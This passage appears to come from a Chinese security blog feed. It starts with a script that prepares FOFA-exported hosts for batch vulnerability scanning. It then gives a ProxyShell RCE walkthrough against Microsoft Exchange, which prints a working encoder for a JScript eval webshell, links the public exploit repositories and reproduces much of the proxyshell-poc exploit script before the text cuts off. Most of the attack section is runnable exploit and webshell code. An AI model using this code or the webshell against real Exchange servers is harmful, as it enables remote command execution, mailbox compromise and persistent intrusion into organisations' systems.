        <content type="html"><![CDATA[<p>使用fofa搜索工具导出来的结果如下图，有些资产并没有http或https前缀，批量扫漏洞的时候格式不符合要求，就想着写个py添加前缀。</p><p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908170308123.png" alt="image-20210908170308123"></p><p>py内容如下，大概原理就是挨个读取每一行，存在http的就跳过，443的就去掉然后添加https前缀，其他就添加http，然后重新生成添加完前缀的fofa.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#python3 .\fofa.py .\xxx.txt</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">#open(&quot;C:\\Users\i\Desktop\CVE-2021-26084_Confluence-main\s.txt&quot;, &#39;w+&#39;).close()   #清空文本，没有就创建</span><br><span class="line">open(&quot;fofa.txt&quot;, &#39;w+&#39;).close()</span><br><span class="line"></span><br><span class="line">def check(hosts):</span><br><span class="line">    #res &#x3D; open(&#39;C:\\Users\i\Desktop\CVE-2021-26084_Confluence-main\s.txt&#39;, &#39;r+&#39;)</span><br><span class="line">    res &#x3D; open(&#39;fofa.txt&#39;, &#39;r+&#39;)</span><br><span class="line">    try:</span><br><span class="line">        if &quot;http&quot; in hosts:</span><br><span class="line">            res.seek(0, 2)#2代表从末尾算起，0代表偏移0个单位</span><br><span class="line">            res.write(hosts+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">        elif &quot;443&quot; in hosts:</span><br><span class="line">            newre1 &#x3D; &quot;https:&#x2F;&#x2F;&quot; + hosts.replace(&quot;:443&quot;,&quot;&quot;)</span><br><span class="line">            res.seek(0, 2)</span><br><span class="line">            res.write(newre1+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            newre&#x3D;&quot;http:&#x2F;&#x2F;&quot;+hosts</span><br><span class="line">            res.seek(0, 2)</span><br><span class="line">            res.write(newre+&quot;\n&quot;)</span><br><span class="line">            res.close()</span><br><span class="line">            pass</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;&#123;&#125;无法访问&quot;.format(hosts))</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    hostfile&#x3D;sys.argv[1]</span><br><span class="line">    hf&#x3D;open(hostfile,&#39;r&#39;)</span><br><span class="line">    for host in hf.readlines():</span><br><span class="line">        check(host.strip(&#39;\n&#39;))</span><br><span class="line">    hf.close()</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908171201001.png" alt="image-20210908171201001"></p><p>效果</p><p><img src="/../../../../images/PY%E5%AD%A6%E4%B9%A0-fofa%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%B7%BB%E5%8A%A0http%E6%88%96https/image-20210908171351024.png" alt="image-20210908171351024"></p><p>当然还有些重复，可以用excel的数据-删除重复项</p>]]></content>
      
      
      
        <tags>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exchange ProxyShell RCE漏洞</title>
      <link href="2021/08/28/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/08/28/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>ProxyShell是利用了Exchange服务器对于路径的不准确过滤导致的路径混淆生成的SSRF，进而使攻击者通过访问PowerShell端点。而在PowerShell端点可以利用Remote PowerShell来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出webshell，从而达成命令执行。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Exchange Server 2010</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829051653850.png" alt="image-20210829051653850"></p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">生成webshell：https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;proxyshell_payload</span><br><span class="line">上传webshell：https:&#x2F;&#x2F;github.com&#x2F;dmaasland&#x2F;proxyshell-poc</span><br></pre></td></tr></table></figure><p>测试发现exchange的webshell貌似不能随便用，比如直接把冰蝎的aspx马放aspnet_client目录下是无法成功连接的，然后测试发现上面脚本自带的两种可以用，另外还有一个哥斯拉的生成的改一下也能用，共三种马。</p><h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><p>proxyshell_payload.py可以用哥斯拉CSHAP_EVAL_AES_BASE64加密方式连接，尾部webshell参数就是我们自定义webshell的地方，使用notepad++替换建议不要使用自动换行。</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829040339931.png" alt="image-20210829040339931"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#coding: UTF-8</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import six</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">DWORD_SIZE &#x3D; 4</span><br><span class="line"></span><br><span class="line">mpbbCrypt &#x3D; [</span><br><span class="line">    65, 54, 19, 98, 168, 33, 110, 187,</span><br><span class="line">    244, 22, 204, 4, 127, 100, 232, 93,</span><br><span class="line">    30, 242, 203, 42, 116, 197, 94, 53,</span><br><span class="line">    210, 149, 71, 158, 150, 45, 154, 136,</span><br><span class="line">    76, 125, 132, 63, 219, 172, 49, 182,</span><br><span class="line">    72, 95, 246, 196, 216, 57, 139, 231,</span><br><span class="line">    35, 59, 56, 142, 200, 193, 223, 37,</span><br><span class="line">    177, 32, 165, 70, 96, 78, 156, 251,</span><br><span class="line">    170, 211, 86, 81, 69, 124, 85, 0,</span><br><span class="line">    7, 201, 43, 157, 133, 155, 9, 160,</span><br><span class="line">    143, 173, 179, 15, 99, 171, 137, 75,</span><br><span class="line">    215, 167, 21, 90, 113, 102, 66, 191,</span><br><span class="line">    38, 74, 107, 152, 250, 234, 119, 83,</span><br><span class="line">    178, 112, 5, 44, 253, 89, 58, 134,</span><br><span class="line">    126, 206, 6, 235, 130, 120, 87, 199,</span><br><span class="line">    141, 67, 175, 180, 28, 212, 91, 205,</span><br><span class="line">    226, 233, 39, 79, 195, 8, 114, 128,</span><br><span class="line">    207, 176, 239, 245, 40, 109, 190, 48,</span><br><span class="line">    77, 52, 146, 213, 14, 60, 34, 50,</span><br><span class="line">    229, 228, 249, 159, 194, 209, 10, 129,</span><br><span class="line">    18, 225, 238, 145, 131, 118, 227, 151,</span><br><span class="line">    230, 97, 138, 23, 121, 164, 183, 220,</span><br><span class="line">    144, 122, 92, 140, 2, 166, 202, 105,</span><br><span class="line">    222, 80, 26, 17, 147, 185, 82, 135,</span><br><span class="line">    88, 252, 237, 29, 55, 73, 27, 106,</span><br><span class="line">    224, 41, 51, 153, 189, 108, 217, 148,</span><br><span class="line">    243, 64, 84, 111, 240, 198, 115, 184,</span><br><span class="line">    214, 62, 101, 24, 68, 31, 221, 103,</span><br><span class="line">    16, 241, 12, 25, 236, 174, 3, 161,</span><br><span class="line">    20, 123, 169, 11, 255, 248, 163, 192,</span><br><span class="line">    162, 1, 247, 46, 188, 36, 104, 117,</span><br><span class="line">    13, 254, 186, 47, 181, 208, 218, 61,</span><br><span class="line">    20, 83, 15, 86, 179, 200, 122, 156,</span><br><span class="line">    235, 101, 72, 23, 22, 21, 159, 2,</span><br><span class="line">    204, 84, 124, 131, 0, 13, 12, 11,</span><br><span class="line">    162, 98, 168, 118, 219, 217, 237, 199,</span><br><span class="line">    197, 164, 220, 172, 133, 116, 214, 208,</span><br><span class="line">    167, 155, 174, 154, 150, 113, 102, 195,</span><br><span class="line">    99, 153, 184, 221, 115, 146, 142, 132,</span><br><span class="line">    125, 165, 94, 209, 93, 147, 177, 87,</span><br><span class="line">    81, 80, 128, 137, 82, 148, 79, 78,</span><br><span class="line">    10, 107, 188, 141, 127, 110, 71, 70,</span><br><span class="line">    65, 64, 68, 1, 17, 203, 3, 63,</span><br><span class="line">    247, 244, 225, 169, 143, 60, 58, 249,</span><br><span class="line">    251, 240, 25, 48, 130, 9, 46, 201,</span><br><span class="line">    157, 160, 134, 73, 238, 111, 77, 109,</span><br><span class="line">    196, 45, 129, 52, 37, 135, 27, 136,</span><br><span class="line">    170, 252, 6, 161, 18, 56, 253, 76,</span><br><span class="line">    66, 114, 100, 19, 55, 36, 106, 117,</span><br><span class="line">    119, 67, 255, 230, 180, 75, 54, 92,</span><br><span class="line">    228, 216, 53, 61, 69, 185, 44, 236,</span><br><span class="line">    183, 49, 43, 41, 7, 104, 163, 14,</span><br><span class="line">    105, 123, 24, 158, 33, 57, 190, 40,</span><br><span class="line">    26, 91, 120, 245, 35, 202, 42, 176,</span><br><span class="line">    175, 62, 254, 4, 140, 231, 229, 152,</span><br><span class="line">    50, 149, 211, 246, 74, 232, 166, 234,</span><br><span class="line">    233, 243, 213, 47, 112, 32, 242, 31,</span><br><span class="line">    5, 103, 173, 85, 16, 206, 205, 227,</span><br><span class="line">    39, 59, 218, 186, 215, 194, 38, 212,</span><br><span class="line">    145, 29, 210, 28, 34, 51, 248, 250,</span><br><span class="line">    241, 90, 239, 207, 144, 182, 139, 181,</span><br><span class="line">    189, 192, 191, 8, 151, 30, 108, 226,</span><br><span class="line">    97, 224, 198, 193, 89, 171, 187, 88,</span><br><span class="line">    222, 95, 223, 96, 121, 126, 178, 138,</span><br><span class="line">    71, 241, 180, 230, 11, 106, 114, 72,</span><br><span class="line">    133, 78, 158, 235, 226, 248, 148, 83,</span><br><span class="line">    224, 187, 160, 2, 232, 90, 9, 171,</span><br><span class="line">    219, 227, 186, 198, 124, 195, 16, 221,</span><br><span class="line">    57, 5, 150, 48, 245, 55, 96, 130,</span><br><span class="line">    140, 201, 19, 74, 107, 29, 243, 251,</span><br><span class="line">    143, 38, 151, 202, 145, 23, 1, 196,</span><br><span class="line">    50, 45, 110, 49, 149, 255, 217, 35,</span><br><span class="line">    209, 0, 94, 121, 220, 68, 59, 26,</span><br><span class="line">    40, 197, 97, 87, 32, 144, 61, 131,</span><br><span class="line">    185, 67, 190, 103, 210, 70, 66, 118,</span><br><span class="line">    192, 109, 91, 126, 178, 15, 22, 41,</span><br><span class="line">    60, 169, 3, 84, 13, 218, 93, 223,</span><br><span class="line">    246, 183, 199, 98, 205, 141, 6, 211,</span><br><span class="line">    105, 92, 134, 214, 20, 247, 165, 102,</span><br><span class="line">    117, 172, 177, 233, 69, 33, 112, 12,</span><br><span class="line">    135, 159, 116, 164, 34, 76, 111, 191,</span><br><span class="line">    31, 86, 170, 46, 179, 120, 51, 80,</span><br><span class="line">    176, 163, 146, 188, 207, 25, 28, 167,</span><br><span class="line">    99, 203, 30, 77, 62, 75, 27, 155,</span><br><span class="line">    79, 231, 240, 238, 173, 58, 181, 89,</span><br><span class="line">    4, 234, 64, 85, 37, 81, 229, 122,</span><br><span class="line">    137, 56, 104, 82, 123, 252, 39, 174,</span><br><span class="line">    215, 189, 250, 7, 244, 204, 142, 95,</span><br><span class="line">    239, 53, 156, 132, 43, 21, 213, 119,</span><br><span class="line">    52, 73, 182, 18, 10, 127, 113, 136,</span><br><span class="line">    253, 157, 24, 65, 125, 147, 216, 88,</span><br><span class="line">    44, 206, 254, 36, 175, 222, 184, 54,</span><br><span class="line">    200, 161, 128, 166, 153, 152, 168, 47,</span><br><span class="line">    14, 129, 101, 115, 228, 194, 162, 138,</span><br><span class="line">    212, 225, 17, 208, 8, 139, 42, 242,</span><br><span class="line">    237, 154, 100, 63, 193, 108, 249, 236</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">mpbbR &#x3D; mpbbCrypt</span><br><span class="line">mpbbS &#x3D; mpbbCrypt[256:]</span><br><span class="line">mpbbI &#x3D; mpbbCrypt[512:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cryptpermute(data, encrypt&#x3D;False):</span><br><span class="line">    table &#x3D; mpbbR if encrypt else mpbbI</span><br><span class="line">    tmp &#x3D; [table[v] for v in data] if six.PY3 else [table[ord(v)] for v in data]</span><br><span class="line">    i &#x3D; 0</span><br><span class="line">    buf &#x3D; bytes(tmp) if six.PY3 else bytearray(tmp)</span><br><span class="line">    stream &#x3D; BytesIO(buf)</span><br><span class="line">    while True:</span><br><span class="line">        b &#x3D; stream.read(DWORD_SIZE)</span><br><span class="line">        try:</span><br><span class="line">            tmp[i] &#x3D; b[0]</span><br><span class="line">            tmp[i + 1] &#x3D; b[1]</span><br><span class="line">            tmp[i + 2] &#x3D; b[2]</span><br><span class="line">            tmp[i + 3] &#x3D; b[3]</span><br><span class="line">            i +&#x3D; DWORD_SIZE</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        if len(b) !&#x3D; DWORD_SIZE:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    return bytes(tmp) if six.PY3 else &#39;&#39;.join(tmp)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    webshell &#x3D; b&quot;&lt;script language&#x3D;&#39;JScript&#39; runat&#x3D;&#39;server&#39; Page aspcompat&#x3D;true&gt;function Page_Load()&#123;eval(Request[&#39;cmd&#39;],&#39;unsafe&#39;);&#125;&lt;&#x2F;script&gt;&quot;</span><br><span class="line">    v1 &#x3D; cryptpermute(webshell, False)</span><br><span class="line">    b64_data &#x3D; base64.b64encode(v1).decode()</span><br><span class="line">    print(&quot;[+] Encode webshell ⬇\n&#123;&#125;\n&quot;.format(b64_data))</span><br><span class="line"></span><br><span class="line">    encode_shell &#x3D; base64.b64decode(b64_data)</span><br><span class="line">    decode_shell &#x3D; cryptpermute(encode_shell, True)</span><br><span class="line">    print(&quot;[+] Decode webshell ⬇\n&#123;&#125;\n&quot;.format(decode_shell.decode()))</span><br></pre></td></tr></table></figure><p>运行后就可以得到加密的webshell</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829035846796.png" alt="image-20210829035846796"></p><p>然后把这段加密的webshell替换到proxyshell_rce.py的&lt;/t:Content/&gt;字段中</p><p><img src="/../../../../images/Exchange%20ProxyShell%20RCE%E6%BC%8F%E6%B4%9E/image-20210829040606294.png" alt="image-20210829040606294"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">#</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;dmaasland&#x2F;proxyshell-poc</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line">import base64</span><br><span class="line">import struct</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import xml.etree.ElementTree as ET</span><br><span class="line"></span><br><span class="line">from pypsrp.wsman import WSMan</span><br><span class="line">from pypsrp.powershell import PowerShell, RunspacePool</span><br><span class="line">from http.server import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">from socketserver import ThreadingMixIn</span><br><span class="line">from functools import partial</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):</span><br><span class="line">    &quot;&quot;&quot;Handle requests in a separate thread.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class PwnServer(BaseHTTPRequestHandler):</span><br><span class="line">    def __init__(self, proxyshell, *args, **kwargs):</span><br><span class="line">        self.proxyshell &#x3D; proxyshell</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    def do_POST(self):</span><br><span class="line">        # From: https:&#x2F;&#x2F;y4y.space&#x2F;2021&#x2F;08&#x2F;12&#x2F;my-steps-of-reproducing-proxyshell&#x2F;</span><br><span class="line">        powershell_url &#x3D; f&#39;&#x2F;powershell&#x2F;?X-Rps-CAT&#x3D;&#123;self.proxyshell.token&#125;&#39;</span><br><span class="line">        length &#x3D; int(self.headers[&#39;content-length&#39;])</span><br><span class="line">        content_type &#x3D; self.headers[&#39;content-type&#39;]</span><br><span class="line">        post_data &#x3D; self.rfile.read(length).decode()</span><br><span class="line"></span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &#39;Content-Type&#39;: content_type</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r &#x3D; self.proxyshell.post(</span><br><span class="line">            